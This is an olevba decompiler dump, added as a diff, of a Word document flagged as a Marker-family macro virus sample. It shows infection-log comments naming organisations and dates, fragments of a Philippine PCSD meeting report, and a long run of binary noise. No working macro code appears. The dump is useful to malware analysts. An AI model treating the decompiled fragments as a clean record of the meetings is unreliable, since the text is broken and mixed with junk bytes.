@@ -1,0 +1,2920 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: ./Virus.MSWord.Marker-based
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: ./Virus.MSWord.Marker-based
+' ===============================================================================
+' Module streams:
+' Macros/VBA/ThisDocument - 85287 bytes
+' Line #0:
+' Line #1:
+' 	FuncDefn (Private Sub Document_New())
+' Line #2:
+' Line #3:
+' 	QuoteRem 0x0000 0x003F "Yarra Valley Water Ltd Loves Nicky F. Also! 22/03/1999 12:32:58"
+' Line #4:
+' 	QuoteRem 0x0000 0x002D "YMP137 Loves Nicky F. Also! 4/8/99 8:17:35 PM"
+' Line #5:
+' 	QuoteRem 0x0000 0x0037 "Staff Use Only Loves Nicky F. Also! 4/21/99 10:25:43 AM"
+' Line #6:
+' 	QuoteRem 0x0000 0x0031 "Open Access Loves Nicky F. Also! 27/04/99 8:45:32"
+' Line #7:
+' 	QuoteRem 0x0000 0x0032 "Open Access Loves Nicky F. Also! 27/04/99 16:20:14"
+' Line #8:
+' 	QuoteRem 0x0000 0x0032 "Open Access Loves Nicky F. Also! 28/04/99 14:39:51"
+' Line #9:
+' 	QuoteRem 0x0000 0x0032 "Open Access Loves Nicky F. Also! 30/04/99 16:24:24"
+' Line #10:
+' 	QuoteRem 0x0000 0x0032 "Open Access Loves Nicky F. Also! 12/05/99 16:47:49"
+' Line #11:
+' 	EndSub 
+' Line #12:
+' Line #13:
+' Line #14:
+' 	QuoteRem 0x0000 0x003F "Yarra Valley Water Ltd Loves Nicky F. Also! 22/03/1999 12:32:58"
+' Line #15:
+' 	QuoteRem 0x0000 0x002D "YMP137 Loves Nicky F. Also! 4/8/99 8:17:35 PM"
+' Line #16:
+' 	QuoteRem 0x0000 0x0037 "Staff Use Only Loves Nicky F. Also! 4/21/99 10:25:43 AM"
+' Line #17:
+' 	QuoteRem 0x0000 0x0031 "Open Access Loves Nicky F. Also! 27/04/99 8:55:35"
+' Line #18:
+' 	QuoteRem 0x0000 0x0032 "Open Access Loves Nicky F. Also! 27/04/99 14:04:27"
+' Line #19:
+' 	QuoteRem 0x0000 0x0032 "Open Access Loves Nicky F. Also! 27/05/99 14:50:12"
+' Line #20:
+' Line #21:
+' 	EndSub 
+' Line #22:
+' 	EndFunc 
+' Line #23:
+' 	EndProp 
+' Line #24:
+' Line #25:
+' Line #26:
+' Line #27:
+' Line #28:
+' Line #29:
+' Line #30:
+' Line #31:
+' 	LitDI2 0x0017 
+' 	LitDI2 0x001D 
+' 	Sub 
+' 	LitDI2 0x07D0 
+' 	ArgsCall August 0x0002 
+' Line #32:
+' Line #33:
+' Line #34:
+' 	Reparse 0x0033 "2nd MEETING ON THE REVISION OF IRR FOR ENTMRPA-PAMB"
+' Line #35:
+' 	Reparse 0x001F "August 23 at Danara Hotel, Q.C."
+' Line #36:
+' Line #37:
+' 	Reparse 0x016B "        The IRR was revised based on the results of the workshop on July 31 to Aug 1 among the various committees of the PAMB.  Request for legal assistance was sought in styling the revised IRR.  The revised version is targeted for presentation in the next regular meeting of the PAMB. The next meeting of the “Style Committee” was set on September 7 in El Nido."
+' Line #38:
+' Line #39:
+' 	Reparse 0x0025 "2nd PCSD-DENR JOINT COMMITTEE MEETING"
+' Line #40:
+' 	Reparse 0x0034 "August 23 at Alfredo’s Steak House, Morato St., Q.C."
+' Line #41:
+' Line #42:
+' 	Ld Procedures 
+' 	ArgsCall ECC 0x0001 
+' Line #43:
+' 	Reparse 0x0039 "Joint inspection of gravel and sand permit applications –"
+' Line #44:
+' 	Reparse 0x006F "PCSDS and DENR staff to hold a workshop for the formulation of guidelines for joint inspection of project sites"
+' Line #45:
+' 	Reparse 0x0068 "DENR suggests the issuance of ECC by zones – terms and conditions in the ECC may differ among applicants"
+' Line #46:
+' 	Reparse 0x004F "Harmonize requirements – Staff to submit recommendations to the Joint Committee"
+' Line #47:
+' 	Reparse 0x003C "For pearl farm – EMB requires checklist, PCSDS requires EIA."
+' Line #48:
+' 	Reparse 0x0058 "For MPSA – in case of exploration, DENR requires consent of the NCIP, PCSD requires EIA."
+' Line #49:
+' 	Reparse 0x0081 "DENR and NCIP have joint Administrative Order on this – Staff to study the joint AO for replication in the case of PCSD and DENR."
+' Line #50:
+' 	Reparse 0x0019 "Delay in ECC processing –"
+' Line #51:
+' 	Reparse 0x00CF "PCSDS Manila staff will follow-up with DENR Region IV applications of Palawan based proponents – PCSDS could furnished by fax Dir. Rina / RED Paragas a list of projects already endorsed by PCSD for follow-up"
+' Line #52:
+' 	ArgsCall Lands 0x0000 
+' Line #53:
+' 	Reparse 0x0050 "In the delineation of forest line – PCSD and DENR should have a joint guidelines"
+' Line #54:
+' 	ArgsCall CALAUIT 0x0000 
+' Line #55:
+' 	Reparse 0x002B "PCSD and DENR will have a joint undertaking"
+' Line #56:
+' 	ArgsCall Tanbark 0x0000 
+' Line #57:
+' 	Reparse 0x00AC "Based on initial discussion between Atty. Alisuag and Sec. Cerilles, the latter agreed to repeal DENR Administrative Order on tanbark.  PCSD to write the Secretary on this."
+' Line #58:
+' 	Ld Fine 
+' 	ArgsCall Administrative 0x0001 
+' Line #59:
+' 	Reparse 0x0197 "Both PCSD and DENR are imposing the P50,000 administrative fine -  for operating without ECC or violating the terms and conditions thereof, in case of DENR, and for operating without PCSD endorsement, in the case of PCSD. This is burdensome especially for small business establishments. The Staff should study this imposition to determine whether or not it impinges on the economic activity in the province."
+' Line #60:
+' 	LitDI2 0x00F7 
+' 	ArgsCall EO 0x0001 
+' Line #61:
+' 	Reparse 0x005C "On the recollection of dichapetalum genolioides, the PCSD should apply for permit with DENR."
+' Line #62:
+' 	Ld Forest 
+' 	ArgsCall Communal 0x0001 
+' Line #63:
+' 	Reparse 0x008F "CBFM concept could be applied. However, the concept should incorporate the participation of the LGUs – Staff to submit recommendations on this."
+' Line #64:
+' Line #65:
+' Line #66:
+' 	Reparse 0x0019 "78th PCSD REGULAR MEETING"
+' Line #67:
+' 	Reparse 0x0023 "August 25 at SB Session Hall, Coron"
+' Line #68:
+' Line #69:
+' 	Reparse 0x0015 "Renewal of Membership"
+' Line #70:
+' Line #71:
+' 	Reparse 0x0047 "DOT – Usec Evelyn Pantig to be notified of her oath taking next meeting"
+' Line #72:
+' 	Reparse 0x0075 "Sangguniang Panlalawigan – Hon. Winston G. Arzaga, Vice-Governor and Presiding Officer of SP took his oath of office."
+' Line #73:
+' Line #74:
+' 	Reparse 0x001E "Projects for Council’s Action:"
+' Line #75:
+' Line #76:
+' 	Reparse 0x0033 "Live Fish & Lobster Trading (Susan Gois) – deferred"
+' Line #77:
+' 	Reparse 0x002E "Live Fish Trading (Ko’s Aquamarine) - approved"
+' Line #78:
+' 	Reparse 0x002E "Live Fish Carrier (Pacific Airways) – deferred"
+' Line #79:
+' Line #80:
+' 	Reparse 0x007C "Proponent should submit to the Council a Board resolution authorizing the Coron agent to file application for accreditation."
+' Line #81:
+' Line #82:
+' 	Reparse 0x0013 "NOTES ON LIVE FISH:"
+' Line #83:
+' 	Reparse 0x007D "species of lapu-lapu should be indicated in the application to ensure that it is not among those banned under local ordinance"
+' Line #84:
+' 	Reparse 0x01BF "In Coron, the PCSD and LGU had a previous agreement that live fish traders/catcher/carrier without accreditation will be given a chance to be accredited up to the end of March, after which period and the concerned proponents fail to get the requisite accreditation the Mayor’s permit issued for the year will be revoked.  All municipalities should adopt this policy. The Council tasked Atty. Alisuag to convene the municipal mayors regarding this."
+' Line #85:
+' Line #86:
+' 	Reparse 0x0027 "Harvesting Permit (Rosalado) – deferred"
+' Line #87:
+' 	Reparse 0x003A "Shell Gasoline Refilling Station (Salonga, Sr.) – deferred"
+' Line #88:
+' 	Reparse 0x0033 "Gasoline Refueling Station (Erlinda Tan) – deferred"
+' Line #89:
+' 	Reparse 0x003C "Golden Horse Trading Shell Station (Wilfredo Tan) – deferred"
+' Line #90:
+' 	Reparse 0x00C5 "Waste Water Treatment (AFI) – Council  to issue Cease and Desist Order (CDO).  If the company cannot improve the operation, it should be advised to transfer to another area outside the city proper."
+' Line #91:
+' 	Reparse 0x005F "Socialised Industrial Forest Management Agreement (Aborlan Tree Growers Cooperative) – deferred"
+' Line #92:
+' 	Reparse 0x0048 "Gravel and Sand Commercial Permit Application (Marijo Hagedorn) – denied"
+' Line #93:
+' 	Reparse 0x0024 "Road Construction (Narra) – approved"
+' Line #94:
+' 	Reparse 0x0029 "Hillside Resort and Restaurant – deferred"
+' Line #95:
+' 	Reparse 0x00CA "Macagua Communal Irrigation Project (DAR) – no representative appeared. But, the requirement to appear was waived as the proponent is the government and the project supports the food production program."
+' Line #96:
+' 	Reparse 0x003F "Sea Breeze Lodging House & Restaurant (Jean Hachero) – approved"
+' Line #97:
+' 	Reparse 0x0035 "Pearl Oysters Farm (Le Reine De Mer, Inc.) – approved"
+' Line #98:
+' 	Reparse 0x0052 "Proponent should indicate in export transactions that the pearl comes from Palawan"
+' Line #99:
+' 	Reparse 0x0086 "PCSDS to closely monitor pearl farm operations to ensure that appropriate navigational sea lanes are provided to municipal fisherfolks"
+' Line #100:
+' 	Reparse 0x009D "Payment of income tax should be made in Palawan – while this cannot be made as a condition, the PCSD should make representation with the pearl farm operators"
+' Line #101:
+' 	Reparse 0x0040 "Renewal of O.M. License for Almaciga (Norma Macasaet) – approved"
+' Line #102:
+' 	Reparse 0x0090 "El Nido Controlled Dumpsite Project (El Nido) – approved, subject to the provisions of the Solid Waste Management Bill, now pending in Congress."
+' Line #103:
+' 	Reparse 0x002E "L & M Lodge & Restaurant (Mercy Pe) – approved"
+' Line #104:
+' 	Reparse 0x0038 "Kristal Langit Lodge (Araceli De Vera Langit) - approved"
+' Line #105:
+' Line #106:
+' 	Reparse 0x0061 "UP-MSI : Project Proposal on “Anti-Cancer Agents from Unique Natural Products Sources” – approved"
+' Line #107:
+' 	Reparse 0x0031 "PCSDS will participate in the collection activity"
+' Line #108:
+' 	Reparse 0x0032 "Coral assessment may be done during the collection"
+' Line #109:
+' Line #110:
+' 	Reparse 0x0031 "MOA on Taytay Bay Conservation Project – approved"
+' Line #111:
+' 	Reparse 0x00A6 "Update on YKR: joint inspection/validation will be done to identify areas for communal forest, agriculture development and settlement sites for agrarian beneficiaries"
+' Line #112:
+' 	Reparse 0x0024 "PCSDS to report on this next meeting"
+' Line #113:
+' Line #114:
+' 	Reparse 0x0012 "Update on Calauit:"
+' Line #115:
+' 	Reparse 0x00B8 "WESCOM is pulling out but coordination with the PNP had been made for police contingent to replace the WESCOM personnel. PNP responded favorably and will deploy personnel by September."
+' Line #116:
+' 	Reparse 0x0058 "Award of certificate of appreciation to the deployed staff was received by Commo Rabago."
+' Line #117:
+' 	Reparse 0x00F8 "Mayor Lim raised the conflict among intruders in the Sanctuary. Atty. Alisuag assured the mayor that the full force of the law would be applied to new intruders.  Cases have been filed against new squatters and the subpoenas are ready to be served."
+' Line #118:
+' 	Reparse 0x0087 "FF Cruz has engaged a Florida-based firm to prepare development plan for the area. A presentation on FF Cruz’s proposal should be made."
+' Line #119:
+' 	Reparse 0x0031 " PCSDS to update the Council on this next meeting"
+' Line #120:
+' Line #121:
+' 	Ld Matters 
+' 	ArgsCall Other 0x0001 
+' 	BoS 0x0000 
+' Line #122:
+' Line #123:
+' 	Reparse 0x0033 "Al Babao’s Report – referred to Committee on Energy"
+' Line #124:
+' 	Reparse 0x0037 "Baham’s Concern  - Staff to report on this next meeting"
+' Line #125:
+' 	Reparse 0x0019 "Illegal Fishing in Cuyo –"
+' Line #126:
+' 	Reparse 0x00C4 "Cong. Sandoval reported that use of cyanide is rampant and local police is helpless.  Secretariat to transcribe the statement of Cong. Sandoval and to be transmitted to NBI for appropriate action."
+' Line #127:
+' Line #128:
+' 	Reparse 0x0031 "MOA on MMT/EGF of Malampaya Natural Gas Project –"
+' Line #129:
+' 	Reparse 0x0093 "The Staff endorses the MOA, except the amount of EGF, which is only P22 million.  The Staff recommends that it should be increased to P100 million."
+' Line #130:
+' 	Reparse 0x00B9 "MMT should include the Philippine Navy, which is now tasked to monitor and provide security in the pipe laying activity. A naval task group is now deployed in Batangas for this purpose."
+' Line #131:
+' Line #132:
+' 	Reparse 0x000E "PTFPP Report –"
+' Line #133:
+' 	Reparse 0x007E "Staff recommends the retention of European Co-Director, Mr. Graham Bell, since it is barely two years before the project ends."
+' Line #134:
+' 	Reparse 0x0023 "Council approved the recommendation"
+' Line #135:
+' Line #136:
+' 	Reparse 0x0021 "Opening of barangay road in Coron"
+' Line #137:
+' 	Reparse 0x000D "CADC in Coron"
+' Line #138:
+' 	Reparse 0x0068 "The Tagbanua Foundation is impinging on the rights of fellow IP’s who are not members of the foundation."
+' Line #139:
+' 	Reparse 0x002D "Tribal rep in the PCSD should look into this."
+' Line #140:
+' Line #141:
+' Line #142:
+' 	Reparse 0x001A "MEETING WITH CALAUIT STAFF"
+' Line #143:
+' 	Reparse 0x001B "August 26 at CGPWS, Calauit"
+' Line #144:
+' Line #145:
+' Line #146:
+' 	Reparse 0x0014 "Security of tenure –"
+' Line #147:
+' 	Reparse 0x00E5 "Salary increase - About P40,000 in monthly savings is derived from salaries of 6 staff who had been separated from the Project. This amount will be divided among the existing staff in the form of salary increase effective August."
+' Line #148:
+' 	Reparse 0x00E5 "Delays in payment of salaries – an average of 2 months in terms of delay in the payment of monthly salaries. The staffs who are sending children to tertiary education outside the municipality find the situation difficult to cope."
+' Line #149:
+' 	Reparse 0x0057 "Cash gift – in 1998, only P1,000 was given as cash gift. In 1999, no 13th pay was paid."
+' Line #150:
+' 	Reparse 0x0019 "Entrance fees as donation"
+' Line #151:
+' 	Reparse 0x0095 "effective immediately collections from entrance fees should be receipted as donation. The amount could be utilized for the operations of the Project."
+' Line #152:
+' 	Reparse 0x0031 "This would require an authority from the Council."
+' Line #153:
+' 	Reparse 0x0010 "Generating set –"
+' Line #154:
+' 	Reparse 0x0087 "a new set with capacity of 20 KVA is needed for use of radio communications system, especially in charging batteries of handheld units."
+' Line #155:
+' 	Reparse 0x0058 "To augment the generating set, the solar panel in Taytay will be transferred to Calauit."
+' Line #156:
+' 	Reparse 0x0012 "Engine for pick-up"
+' Line #157:
+' 	Reparse 0x002F "Engine in Manila will be transferred to Calauit"
+' Line #158:
+' 	Reparse 0x0019 "BCM/reactivation of CAFGU"
+' Line #159:
+' 	Reparse 0x009B "The news regarding the filing of cases against the squatters served as deterrent to possible influx of more squatters in the inner portion of the sanctuary"
+' Line #160:
+' 	Reparse 0x002E "CAFGUs will be reactivated to provide security"
+' Line #161:
+' 	Reparse 0x0030 "Re-training of existing CAFGU staff will be done"
+' Line #162:
+' Line #163:
+' 	Reparse 0x0056 "PUBLIC HEARING ON SOUTHERN PALAWAN ECOZONE AT THE SENATE COMMITTEE ON ECONOMIC AFFAIRS"
+' Line #164:
+' 	Reparse 0x0033 "August 29 at Pecson Room, Senate Bldg, GSIS Complex"
+' Line #165:
+' Line #166:
+' Line #167:
+' 	Reparse 0x011E "PCSDS was invited as observer. In the next meeting, PCSDS will serve as resource speaker on House Bill No. 9964 and Senate Bill No. 1941, both entitled “An Act Establishing the Southern Palawan Special Economic Zone and Freeport Act”. The Committee was chaired by Senator Loren Legarda."
+' Line #168:
+' Line #169:
+' 	Reparse 0x0159 "The hearing was attended by Senator Rene Cayetano and Dep. Speaker Alfredo E. Abueg, Jr.  The resource persons included representatives from PEZA, NEDA, DOT, NTRC, DOF, Mr. Baham Mitra,  as Presidential consultant for Palawan, and the LGU of Brooke’s Point, headed by Mayor Lacanilao, the Vice-Mayor and several members of the Sangguniang Bayan."
+' Line #170:
+' Line #171:
+' 	Reparse 0x0021 "The following issues were raised:"
+' Line #172:
+' Line #173:
+' 	Reparse 0x001F "Ideal location of the Ecozone –"
+' Line #174:
+' 	Reparse 0x00B3 "the original House Bill authored by Dep. Speaker Abueg recommended Brooke’s Point as the ideal location. But, in the final version of the Bill the location was changed to Balabac."
+' Line #175:
+' 	Reparse 0x004E "Mayor Lacanilao urged for the inclusion of Brooke’s Point as alternative site."
+' Line #176:
+' 	Reparse 0x00BD "Mr. Baham Mitra supported the position of Mayor Lacanilao, considering  Brooke’s Point as the center of commerce and trade in southern Palawan and has bigger population compared to Balabac."
+' Line #177:
+' Line #178:
+' 	Reparse 0x001B "Creation of a New Authority"
+' Line #179:
+' 	Reparse 0x00AA "NEDA representative opposes the creation of another authority as RA 7916, otherwise known as the “Special Economic Zone Act of 1995”, already mention a portion of Palawan"
+' Line #180:
+' 	Reparse 0x00D9 "PEZA representative fully endorses the Bill, with the suggestion that PEZA be represented in the Board.  The creation of a new authority will mean an exemption just like the four special economic zones in the country."
+' Line #181:
+' Line #182:
+' 	Reparse 0x003B "Tax provisions - DOF representative suggests the following:"
+' Line #183:
+' 	Reparse 0x00DD " HB No. 9964 should conform with the RA 8748, which provides for 5% of gross income earned by business enterprises within the zone shall be paid and remitted as follows: 3% to national government and 2% to the localities."
+' Line #184:
+' 	Reparse 0x010A "On SB No. 1941, DOF representative favors the tax on net income compared to tax on gross income.  However, the tax rate of 8% should be increased to 15% to conform with HB No. 9964 because the 5% on gross income is approximately 15% of net based on DOF computations."
+' Line #185:
+' 	Reparse 0x008B "Exemption on withholding tax of parent companies to avoid double taxation should not be granted as this is already covered by tax treaties."
+' Line #186:
+' Line #187:
+' 	Reparse 0x010D "Powers of the Board – from DENR representative: whether or not the powers of DENR to issue ECC, free patents and leasehold rights over government lands and mining, drilling and timber licenses are expressly transferred to the SPEZA by virtue of Section 9(j) of SB 1941."
+' Line #188:
+' 	Reparse 0x0103 "Issuance of ECC is covered by PD 1586 and DAO 96-37; free patent, by PD 6940, RA 2011 and EO 192; mining rights, by RA 7942 and DAO 96-40; and the regulations and supervision of forest lands including classification and reclassification are covered by PD 705."
+' Line #189:
+' Line #190:
+' 	Reparse 0x0030 "Formulation of IRR – should include DOT and DENR"
+' Line #191:
+' 	Reparse 0x0037 "Page  PAGE 3 of  NUMPAGES 6 Back to Office Report"
+' Line #192:
+' Line #193:
+' Line #194:
+' Line #195:
+' Line #196:
+' Line #197:
+' Line #198:
+' Line #199:
+' Line #200:
+' Line #201:
+' Line #202:
+' Line #203:
+' Line #204:
+' Line #205:
+' Line #206:
+' Line #207:
+' Line #208:
+' Line #209:
+' 	Reparse 0x000C "5\x08�6\x08�>*CJ"
+' Line #210:
+' 	Reparse 0x0001 ""
+' Line #211:
+' 	Reparse 0x0001 "&"
+' Line #212:
+' 	Reparse 0x0011 "Æ       hp\x088"
+' Line #213:
+' 	Reparse 0x0001 ""
+' Line #214:
+' 	Reparse 0x0001 "&"
+' Line #215:
+' 	Reparse 0x0011 "Æ       hp\x088"
+' Line #216:
+' 	Reparse 0x0001 "&"
+' Line #217:
+' 	Reparse 0x0007 "Æhp\x08"
+' Line #218:
+' 	Reparse 0x0001 "&"
+' Line #219:
+' 	Reparse 0x0007 "Æhp\x08"
+' Line #220:
+' 	Reparse 0x0005 "&
+' F'"
+' Line #221:
+' 	Reparse 0x0007 "Æ p\x08"
+' Line #222:
+' 	Reparse 0x0001 "&"
+' Line #223:
+' Line #224:
+' Line #225:
+' Line #226:
+' Line #227:
+' Line #228:
+' Line #229:
+' Line #230:
+' Line #231:
+' Line #232:
+' Line #233:
+' Line #234:
+' Line #235:
+' 	Reparse 0x0007 "Äÿÿÿ\x08"
+' Line #236:
+' 	Reparse 0x0007 "Ûÿÿÿ\x08"
+' Line #237:
+' 	Reparse 0x0002 ""
+' Line #238:
+' 	Reparse 0x0001 ""
+' Line #239:
+' 	Reparse 0x0002 ""
+' Line #240:
+' 	Reparse 0x0001 ""
+' Line #241:
+' 	Reparse 0x0002 ""
+' Line #242:
+' 	Reparse 0x0001 ""
+' Line #243:
+' 	Reparse 0x0002 ""
+' Line #244:
+' 	Reparse 0x0001 ""
+' Line #245:
+' 	Reparse 0x0002 "\x088"
+' Line #246:
+' 	Reparse 0x0001 ""
+' Line #247:
+' 	Reparse 0x0002 "\x088"
+' Line #248:
+' 	Reparse 0x0001 ""
+' Line #249:
+' 	Reparse 0x0001 ""
+' Line #250:
+' 	Reparse 0x0001 ""
+' Line #251:
+' 	Reparse 0x0002 ""
+' Line #252:
+' Line #253:
+' Line #254:
+' Line #255:
+' Line #256:
+' Line #257:
+' Line #258:
+' 	Reparse 0x0001 ""
+' Line #259:
+' 	Reparse 0x0001 "&"
+' Line #260:
+' 	Reparse 0x0009 "Æp\x08\x08"
+' Line #261:
+' 	Reparse 0x0001 ""
+' Line #262:
+' 	Reparse 0x0001 "&"
+' Line #263:
+' 	Reparse 0x0011 "Æ       hp\x088"
+' Line #264:
+' 	Reparse 0x0001 ""
+' Line #265:
+' 	Reparse 0x0001 "&"
+' Line #266:
+' 	Reparse 0x0011 "Æ       hp\x088"
+' Line #267:
+' 	Reparse 0x0001 ""
+' Line #268:
+' 	Reparse 0x0001 "&"
+' Line #269:
+' 	Reparse 0x0011 "Æ       hp\x088"
+' Line #270:
+' 	Reparse 0x0001 "&"
+' Line #271:
+' 	Reparse 0x0005 "Æp\x08"
+' Line #272:
+' 	Reparse 0x0001 ""
+' Line #273:
+' 	Reparse 0x0001 "&"
+' Line #274:
+' 	Reparse 0x0011 "Æ       hp\x088"
+' Line #275:
+' 	Reparse 0x0001 ""
+' Line #276:
+' 	Reparse 0x0001 "&"
+' Line #277:
+' 	Reparse 0x0012 "Æ       hp\x088"
+' Line #278:
+' 	Reparse 0x0001 "&"
+' Line #279:
+' 	Reparse 0x0001 ""
+' Line #280:
+' 	Reparse 0x0001 "&"
+' Line #281:
+' 	Reparse 0x0011 "Æ       hp\x088"
+' Line #282:
+' 	Reparse 0x0005 "&
+' F'"
+' Line #283:
+' 	Reparse 0x0007 "Æ p\x08"
+' Line #284:
+' 	Reparse 0x0001 "&"
+' Line #285:
+' 	Reparse 0x0009 "Æh\x08"
+' Line #286:
+' Line #287:
+' Line #288:
+' Line #289:
+' Line #290:
+' Line #291:
+' Line #292:
+' Line #293:
+' Line #294:
+' 	Reparse 0x0001 "&"
+' Line #295:
+' 	Reparse 0x000A "Æh8"
+' Line #296:
+' 	Reparse 0x0005 "&
+' F"
+' Line #297:
+' 	Reparse 0x0005 "Æ "
+' Line #298:
+' 	Reparse 0x0001 "&"
+' Line #299:
+' 	Reparse 0x000A "Æh8"
+' Line #300:
+' 	Reparse 0x0001 "&"
+' Line #301:
+' 	Reparse 0x0001 ""
+' Line #302:
+' 	Reparse 0x0001 "&"
+' Line #303:
+' 	Reparse 0x0011 "Æ       hp\x088"
+' Line #304:
+' 	Reparse 0x0001 "
+' "
+' Line #305:
+' Line #306:
+' Line #307:
+' Line #308:
+' 	Reparse 0x0001 "\x08"
+' Line #309:
+' 	Reparse 0x0001 ""
+' Line #310:
+' 	Reparse 0x0001 ""
+' Line #311:
+' 	Reparse 0x0001 ""
+' Line #312:
+' 	Reparse 0x0001 ""
+' Line #313:
+' 	Reparse 0x0001 ""
+' Line #314:
+' 	Reparse 0x0007 ">ýÿÿ\x08"
+' Line #315:
+' 	Reparse 0x0002 ""
+' Line #316:
+' 	Reparse 0x0007 "Qþÿÿ\x08\"
+' Line #317:
+' 	Reparse 0x0001 ""
+' Line #318:
+' 	Reparse 0x0001 ""
+' Line #319:
+' 	Reparse 0x0001 ""
+' Line #320:
+' 	Reparse 0x0001 ""
+' Line #321:
+' Line #322:
+' 	Reparse 0x0001 "&"
+' Line #323:
+' 	Reparse 0x0009 "Æh8"
+' Line #324:
+' Line #325:
+' 	Reparse 0x0001 "&"
+' Line #326:
+' 	Reparse 0x0009 "Æh8"
+' Line #327:
+' Line #328:
+' 	Reparse 0x0001 "&"
+' Line #329:
+' 	Reparse 0x000A "Æh8
+' "
+' Line #330:
+' 	Reparse 0x0005 "&
+' F"
+' Line #331:
+' 	Reparse 0x0005 "Æ "
+' Line #332:
+' 	Reparse 0x0001 "&"
+' Line #333:
+' 	Reparse 0x0005 "Æh"
+' Line #334:
+' 	Reparse 0x0001 "&"
+' Line #335:
+' 	Reparse 0x0005 "Æh"
+' Line #336:
+' 	Reparse 0x0001 ""
+' Line #337:
+' 	Reparse 0x0001 ""
+' Line #338:
+' 	Reparse 0x0001 ""
+' Line #339:
+' 	Reparse 0x0002 ""
+' Line #340:
+' 	Reparse 0x0002 ""
+' Line #341:
+' 	Reparse 0x0001 ""
+' Line #342:
+' 	Reparse 0x0002 ""
+' Line #343:
+' 	Reparse 0x0002 ""
+' Line #344:
+' 	Reparse 0x0001 ""
+' Line #345:
+' 	Reparse 0x0001 ""
+' Line #346:
+' 	Reparse 0x0001 ""
+' Line #347:
+' 	Reparse 0x0001 ""
+' Line #348:
+' 	Reparse 0x0001 ""
+' Line #349:
+' 	Reparse 0x0007 "Ïöÿÿ\x08_"
+' Line #350:
+' 	Reparse 0x0007 "V÷ÿÿ\x08^"
+' Line #351:
+' 	Reparse 0x0007 "©÷ÿÿ\x08]"
+' Line #352:
+' 	Reparse 0x0001 ""
+' Line #353:
+' Line #354:
+' Line #355:
+' 	Reparse 0x0001 "
+' "
+' Line #356:
+' 	Reparse 0x0001 "&"
+' Line #357:
+' 	Reparse 0x000B "Æh8
+' "
+' Line #358:
+' 	Reparse 0x0001 "&"
+' Line #359:
+' 	Reparse 0x0009 "Æh8"
+' Line #360:
+' 	Reparse 0x0001 "&"
+' Line #361:
+' 	Reparse 0x000B "Æh8
+' "
+' Line #362:
+' 	Reparse 0x0001 "&"
+' Line #363:
+' 	Reparse 0x000B "Æh8"
+' Line #364:
+' 	Reparse 0x0001 "&"
+' Line #365:
+' 	Reparse 0x0005 "&
+' F"
+' Line #366:
+' 	Reparse 0x0005 "Æ "
+' Line #367:
+' 	Reparse 0x0002 ""
+' Line #368:
+' 	Reparse 0x0001 ""
+' Line #369:
+' 	Reparse 0x0001 ""
+' Line #370:
+' 	Reparse 0x0002 ""
+' Line #371:
+' 	Reparse 0x0002 ""
+' Line #372:
+' 	Reparse 0x0001 ""
+' Line #373:
+' 	Reparse 0x0002 ""
+' Line #374:
+' 	Reparse 0x0002 ""
+' Line #375:
+' 	Reparse 0x0001 ""
+' Line #376:
+' 	Reparse 0x0002 ""
+' Line #377:
+' 	Reparse 0x0001 ""
+' Line #378:
+' 	Reparse 0x0007 "ðÿÿ\x08"
+' Line #379:
+' 	Reparse 0x0001 ""
+' Line #380:
+' 	Reparse 0x0001 ""
+' Line #381:
+' 	Reparse 0x0001 ""
+' Line #382:
+' 	Reparse 0x0001 ""
+' Line #383:
+' 	Reparse 0x0001 ""
+' Line #384:
+' 	Reparse 0x0001 "&"
+' Line #385:
+' 	Reparse 0x000B "Æh8
+' "
+' Line #386:
+' 	Reparse 0x0001 "&"
+' Line #387:
+' 	Reparse 0x000B "Æh8
+' "
+' Line #388:
+' 	Reparse 0x0001 "&"
+' Line #389:
+' 	Reparse 0x000B "Æh8
+' "
+' Line #390:
+' 	Reparse 0x0001 "&"
+' Line #391:
+' 	Reparse 0x000B "Æh8
+' "
+' Line #392:
+' 	Reparse 0x0001 "&"
+' Line #393:
+' 	Reparse 0x0009 "Æh8"
+' Line #394:
+' 	Reparse 0x0001 "&"
+' Line #395:
+' 	Reparse 0x0009 "Æh8"
+' Line #396:
+' 	Reparse 0x0001 ""
+' Line #397:
+' 	Reparse 0x0005 "&
+' F"
+' Line #398:
+' 	Reparse 0x0005 "Æ "
+' Line #399:
+' 	Reparse 0x0002 ""
+' Line #400:
+' 	Reparse 0x0001 ""
+' Line #401:
+' 	Reparse 0x0001 ""
+' Line #402:
+' 	Reparse 0x0007 "Hçÿÿ\x08I"
+' Line #403:
+' 	Reparse 0x0001 ""
+' Line #404:
+' 	Reparse 0x0007 "’çÿÿ\x08H"
+' Line #405:
+' 	Reparse 0x0001 ""
+' Line #406:
+' 	Reparse 0x0001 ""
+' Line #407:
+' 	Reparse 0x0007 "‡èÿÿ\x08F"
+' Line #408:
+' 	Reparse 0x0001 ""
+' Line #409:
+' 	Reparse 0x0007 "Ëèÿÿ\x08D"
+' Line #410:
+' 	Reparse 0x0007 "aéÿÿ\x08G"
+' Line #411:
+' 	Reparse 0x0001 ""
+' Line #412:
+' 	Reparse 0x0001 ""
+' Line #413:
+' 	Reparse 0x0001 ""
+' Line #414:
+' 	Reparse 0x0001 ""
+' Line #415:
+' 	Reparse 0x0007 "·ëÿÿ\x08B"
+' Line #416:
+' 	Reparse 0x0002 ""
+' Line #417:
+' Line #418:
+' 	Reparse 0x0001 "&"
+' Line #419:
+' 	Reparse 0x000A "Æh8"
+' Line #420:
+' 	Reparse 0x0001 "&"
+' Line #421:
+' 	ArgsCall Æ 0x0000 
+' Line #422:
+' 	Reparse 0x000A "h8ƒ"
+' Line #423:
+' Line #424:
+' 	Reparse 0x0001 "&"
+' Line #425:
+' 	Reparse 0x000A "Æh8"
+' Line #426:
+' 	Reparse 0x0001 "&"
+' Line #427:
+' 	ArgsCall Æ 0x0000 
+' Line #428:
+' 	Reparse 0x000A "hÐ8"
+' Line #429:
+' 	Reparse 0x0001 "&"
+' Line #430:
+' 	Reparse 0x0009 "ÆhÐ"
+' Line #431:
+' 	Reparse 0x0001 "&"
+' Line #432:
+' 	Reparse 0x0009 "Æh8"
+' Line #433:
+' 	Reparse 0x0001 "&"
+' Line #434:
+' 	Reparse 0x000A "Æh8"
+' Line #435:
+' 	Reparse 0x0001 "&"
+' Line #436:
+' 	Reparse 0x0009 "ÆhÐ"
+' Line #437:
+' Line #438:
+' 	Reparse 0x0001 "&"
+' Line #439:
+' 	Reparse 0x0009 "Æh8"
